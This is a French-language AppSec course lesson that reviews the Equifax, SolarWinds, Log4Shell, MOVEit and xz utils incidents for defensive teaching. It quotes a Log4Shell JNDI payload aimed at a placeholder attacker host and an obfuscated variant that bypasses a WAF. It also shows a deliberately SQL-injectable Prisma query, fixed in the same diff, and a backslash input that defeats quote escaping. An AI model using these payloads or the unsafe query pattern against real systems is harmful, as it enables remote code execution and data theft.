## Equifax : savoir ce qu'on fait tourner

Le mécanisme technique est une injection d'expressions OGNL dans le parseur multipart Jakarta d'Apache Struts (**CVE-2017-5638**) : un en-tête `Content-Type` forgé suffisait à exécuter des commandes, sans authentification. Struts avait publié les versions corrigées (2.3.32 et 2.5.10.1) début mars 2017. Le GAO rapporte que des inconnus ont scanné Equifax le 10 mars, deux jours après l'alerte du US-CERT, et confirmé l'exécution de commandes sur le portail de contestation. L'exfiltration commence le 13 mai et dure environ 76 jours, jusqu'à sa découverte le 29 juillet ; au moins 145,5 millions de personnes sont touchées.

La faille était **connue, corrigée, et invisible** pour qui devait la corriger (les autres facteurs sont en leçon 1). Equifax est devenu l'argument de référence pour l'**analyse de composition** (SCA) branchée sur un inventaire réel de la production, et pour des délais de correction avec un propriétaire nommé (M26).

## SolarWinds : le build est une cible

En décembre 2020, Mandiant révèle que des mises à jour signées du logiciel de supervision **Orion** contiennent une porte dérobée, SUNBURST, distribuée à partir de mars 2020. Le 13 décembre, la directive d'urgence ED 21-01 de la CISA ordonne aux agences fédérales de débrancher les versions 2019.4 à 2020.2.1 HF1. SolarWinds déclare à la SEC que moins de 18 000 clients ont pu installer une version piégée.

C'est le mécanisme qui a marqué le métier. CrowdStrike a analysé l'outil posé sur la machine de build, **SUNSPOT** : il surveillait le processus `MsBuild.exe` et remplaçait un fichier source d'Orion par sa version piégée le temps de la compilation, puis restaurait l'original. Le dépôt restait propre ; le binaire signé ne l'était pas. Aucune revue de code, aucun SAST ne pouvait le voir.

Ce que cela a changé : le décret présidentiel américain 14028 (12 mai 2021) charge le NIST de définir les pratiques de développement sécurisé attendues des fournisseurs de l'État fédéral, d'où le **NIST SSDF**, l'attestation de conformité et le **SBOM**. Côté pratique, SLSA et les attestations de provenance (M18, leçon 10) répondent à la question « ce binaire vient-il bien de ce code ? ».

## Log4Shell : quand une donnée devient du code

Le rapport du Cyber Safety Review Board (11 juillet 2022) retrace l'origine : en juillet 2013, le projet Log4j accepte une contribution qui ajoute les **lookups JNDI**. Huit ans plus tard, le 24 novembre 2021, un ingénieur d'Alibaba Cloud signale à l'Apache Software Foundation qu'un message journalisé contenant `${jndi:ldap://attaquant/x}` fait charger et exécuter du code distant. Le correctif 2.15.0 et la **CVE-2021-44228** (CVSS 10) sortent le 10 décembre, après une fuite de la preuve de concept. Le CSRB qualifie Log4j de **vulnérabilité endémique**, présente pour une décennie ou plus.

La classe de bugs est plus large que Java : une bibliothèque **interprète** une donnée qu'on croyait inerte. Le mauvais correctif l'illustre bien. Bloquer « jndi » au WAF tombe devant `${${lower:j}ndi:ldap://…}`, que Log4j reconstruit avant de l'évaluer. Même le premier correctif officiel était incomplet : la **CVE-2021-45046** a montré que 2.15.0 restait exploitable dans certaines configurations non par défaut. On n'élimine pas une classe en filtrant une forme, on l'élimine en retirant l'interprétation.

L'autre leçon est organisationnelle : la question « où tourne Log4j chez nous ? » est difficile quand la bibliothèque est une **dépendance transitive** embarquée dans des produits tiers. Le CSRB le souligne : un propriétaire peut ignorer où le composant vulnérable se trouve chez lui. C'est le cas d'usage qui a donné au SBOM son sens opérationnel.

## MOVEit : une injection SQL en 2023

L'avis conjoint CISA-FBI **AA23-158A** (7 juin 2023) décrit l'exploitation, à partir du 27 mai 2023, d'une injection SQL dans **MOVEit Transfer** (CVE-2023-34362) par le groupe CL0P. Le web shell déposé, LEMURLOOT (`human2.aspx`), permet d'énumérer les bases et de voler les fichiers. CL0P ne chiffre pas : il vole et menace de publier, comme il l'avait déjà fait avec d'autres logiciels de transfert (Accellion FTA, GoAnywhere).

Ce que l'affaire a changé : en mars 2024, la CISA et le FBI publient une alerte *Secure by Design* consacrée à l'**élimination des injections SQL**, en citant l'exploitation d'une application de transfert de fichiers qui a touché des milliers d'organisations. Le message : vingt ans après, cette classe ne devrait plus exister. Dans une API Node, elle se loge dans les échappatoires des ORM :

<Diff file="apps/api/src/routes/invoices-search.ts" hlBefore="3-5" hlAfter="3-7">

```ts
router.get('/invoices/search', async (req, res) => {
  const q = String(req.query.q ?? '');
  // « On échappe les apostrophes » : le mauvais correctif classique.
  const safe = q.replace(/'/g, "''");
  const rows = await prisma.$queryRawUnsafe(`SELECT * FROM invoices WHERE tenant_id = '${req.user.tenantId}' AND label ILIKE '%${safe}%'`);
  res.json(rows);
});
```

```ts
router.get('/invoices/search', async (req, res) => {
  const q = String(req.query.q ?? '');
  // Gabarit étiqueté : Prisma envoie la requête et les valeurs séparément,
  // aucune donnée ne peut devenir de la syntaxe SQL.
  const rows = await prisma.$queryRaw`
    SELECT id, label, amount FROM invoices
    WHERE tenant_id = ${req.user.tenantId} AND label ILIKE ${'%' + q + '%'}`;
  res.json(rows);
});
```

</Diff>

Doubler les apostrophes donne une illusion de sécurité. Dans cette même requête, `tenantId` n'est pas échappé : il suffit d'une valeur oubliée, ici ou dans une autre route. Et sur un moteur qui interprète l'antislash, comme MySQL dans sa configuration par défaut, la saisie `\'` devient `\''` : l'antislash neutralise la première apostrophe, la seconde ferme la chaîne. Seule la requête paramétrée, imposée par une règle de revue qui interdit `$queryRawUnsafe` (M16), la ferme.

## xz utils : la confiance dans le mainteneur

<Callout kind="case">
Le 29 mars 2024, Andres Freund publie sur la liste oss-security l'analyse d'une porte dérobée dans **xz utils 5.6.0 et 5.6.1** (CVE-2024-3094), découverte en enquêtant sur des connexions SSH environ 500 ms plus lentes que d'habitude. La charge visait `sshd` de façon indirecte : sur Debian et les distributions RPM, `sshd` est lié à libsystemd, qui dépend de liblzma. Le déclencheur se trouvait dans un fichier `build-to-host.m4` présent **uniquement dans les archives publiées**, pas dans le dépôt Git. Le compte « Jia Tan » contribuait depuis fin 2021 ; des comptes tiers avaient fait pression en 2022 sur le mainteneur historique, épuisé, pour qu'il cède des droits. La CISA publie une alerte le jour même et recommande de revenir à une version antérieure.
</Callout>

Trois conséquences pour l'AppSec. **L'artefact publié n'est pas le dépôt** : ce qu'on installe depuis npm peut différer de ce qu'on lit sur GitHub, et c'est l'archive qu'il faut auditer (M18, leçon 7). **La santé d'un projet est un critère de sécurité** : un mainteneur seul et débordé est une surface d'attaque (M18, leçon 6). **La détection vient parfois d'un détail** : une latence de 500 ms, remarquée par quelqu'un qui mesurait autre chose.

<Callout kind="novafact">
« Où serait-elle chez nous ? » Equifax : une dépendance serveur plus suivie. SolarWinds : le runner qui construit le SDK. Log4Shell : le moteur de gabarits des e-mails de facture. MOVEit : trois `$queryRawUnsafe` trouvés par grep. xz : un paquet critique à mainteneur unique. Cinq réponses, cinq tickets.
</Callout>
